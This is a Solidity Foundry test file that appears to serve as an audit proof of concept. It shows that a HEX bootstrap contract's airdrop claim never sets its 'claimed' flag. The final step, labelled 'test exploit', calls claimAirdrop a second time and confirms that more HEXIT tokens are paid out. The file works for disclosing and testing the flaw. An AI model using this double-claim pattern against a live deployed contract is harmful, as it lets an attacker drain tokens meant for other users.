// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.20;

import "../Base.t.sol";
import "./utils/BootstrapHelper.sol";
import "../../src/interfaces/IHexToken.sol";

contract AirdropNoStateUpdateTest is BootstrapHelper {
    function testAirdropNoStateUpdate() public {
        uint256 amount = 100e8;

        // give HEX to the sender
        _dealToken(hexToken, user, amount * 2);

        // user sacrifices HEX
        vm.startPrank(user);
        _sacrifice(hexToken, amount);
        vm.stopPrank();

        // assert total HEX sacrificed
        assertEq(bootstrap.totalHexAmount(), amount);

        //skip 30 days so ensure that sacrifice period already ended
        skip(30 days);

        //calculate the corresponding to 12.5% of the total HEX deposited
        uint256 amountOfHexToDai = (amount * 1250) / 10000;

        //deployer processes the sacrifice
        vm.startPrank(deployer);
        _processSacrifice(amountOfHexToDai);
        vm.stopPrank();

        //user claims HEX1 and HEXIT from the sacrifice
        vm.startPrank(user);
        bootstrap.claimSacrifice();
        vm.stopPrank();

        //skip the sacrifice claim period
        skip(7 days);

        //user creates a new HEX stake so that he is eligible to claim more HEXIT
        vm.prank(user);
        IHexToken(hexToken).stakeStart(amount, 5555);

        //start the airdrop
        vm.prank(deployer);
        bootstrap.startAidrop();

        //store the user HEXIT balance before claiming the airdrop
        uint256 userHexitBalanceBefore = IERC20(hexit).balanceOf(user);

        //users claims airdrop
        vm.prank(user);
        bootstrap.claimAirdrop();

        //get claimedAirdrop bool
        (,,, bool claimedAirdrop) = bootstrap.userInfos(user);

        //assert that user did not claim the airdrop
        assertEq(claimedAirdrop, false);

        //assert user HEXIT balance
        uint256 hexitBalanceAfter = IERC20(hexit).balanceOf(user);
        assertGt(hexitBalanceAfter, userHexitBalanceBefore);

        //test exploit
        vm.prank(user);
        bootstrap.claimAirdrop();

        //assert user HEXIT balance exploit
        uint256 hexitBalanceExploit = IERC20(hexit).balanceOf(user);
        assertGt(hexitBalanceExploit, hexitBalanceAfter);
    }
}
